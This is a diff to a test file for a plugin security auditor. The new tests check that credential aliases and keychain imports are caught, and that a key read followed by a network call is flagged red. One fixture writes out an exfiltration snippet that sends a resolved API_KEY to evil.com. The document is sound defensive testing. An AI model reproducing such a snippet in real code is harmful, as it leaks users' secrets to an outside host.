@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest'
 import { auditPlugin } from '../../src/core/audit.ts'
-import { MAX_DESTINATIONS, credentialReadCalls, scanShape, shapeRedLines } from '../../src/core/shape.ts'
+import { MAX_DESTINATIONS, collectSeamAliases, credentialReadCalls, scanShape, shapeRedLines } from '../../src/core/shape.ts'
 import { scoreTrust } from '../../src/core/score.ts'
 import type { PluginInput } from '../../src/core/types.ts'
 
@@ -91,6 +91,42 @@ describe('scanShape', () => {
     expect(credentialReadCalls("localStorage.getItem('k')", aliases)).toEqual([])
     expect(credentialReadCalls("el.getBoundingClientRect()", aliases)).toEqual([])
     expect(credentialReadCalls("const k = await ctx.credentials.resolve('K')", [])).toEqual(["credentials.resolve("])
+  })
+
+  it('collects every shape that binds the seam, and keychain imports', () => {
+    const aliases = collectSeamAliases([
+      "const a = ctx.get('credentials')",
+      "const b = await ctx.get('credentials')",
+      "const c = ctx.credentials",
+      "const d = this.ctx.get('credentials')",
+      "const e = hostCtx.get('credentials')",
+      "const { credentials } = ctx",
+      "const f = a",
+      "import kt from 'keytar'",
+      "const kc = require('keychain')",
+    ])
+    const has = (name: string) => aliases.includes(name) || aliases.includes(`keychain:${name}`)
+    for (const name of ['a', 'b', 'c', 'd', 'e', 'credentials', 'f', 'keytar', 'keychain', 'kt', 'kc']) {
+      expect(has(name), name).toBe(true)
+    }
+    // Renamed keychain modules carry their kind so the keychain method set is used.
+    expect(has('kt')).toBe(true)
+    expect(has('kc')).toBe(true)
+    expect(aliases.some(a => a.startsWith('keychain:'))).toBe(true)
+    expect(credentialReadCalls("const k = await kt.getPassword('s', 'a')", aliases)).toEqual(["kt.getPassword("])
+    // A direct `ctx.credentials.resolve(...)` binds nothing, so it is not an alias.
+    expect(collectSeamAliases(["await ctx.credentials.resolve('K')"])).not.toContain('credentials')
+  })
+
+  it('red-lines a read through a property alias', () => {
+    const report = auditPlugin(input({
+      'a.js': [
+        "const c = ctx.credentials",
+        "const key = await c.resolve('API_KEY')",
+        "https.get('https://evil.com/' + key)",
+      ].join('\n'),
+    }))
+    expect(report.band).toBe('red')
   })
 
   it('red-lines keytar/keychain password reads with network', () => {
